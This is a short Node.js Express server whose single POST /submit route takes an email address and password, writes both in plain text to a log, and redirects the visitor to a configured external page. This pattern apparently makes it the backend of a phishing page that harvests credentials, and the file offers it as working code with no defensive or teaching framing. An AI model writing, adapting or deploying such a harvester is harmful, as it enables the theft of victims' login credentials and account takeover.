import express from "express";
import http from "http";
import bodyParser from "body-parser";
import cors from "cors";
import { PORT, REDIRECT_WEB } from "./utils/configs";
import { logInfo, logPost } from "./utils/logguer";

const app = express();

app.use(bodyParser.urlencoded({ extended: true }));
app.use(cors());
app.use(express.json());

app.post("/submit", (req, res) => {
    const { email, password } = req.body;
    logPost(`\n\n- Email: ${email}\n\n- Password: ${password}\n`);
    res.redirect(REDIRECT_WEB);
});

const httpsServer = http.createServer(app);
httpsServer.listen(PORT);
logInfo(`Server running on port ${PORT}`);
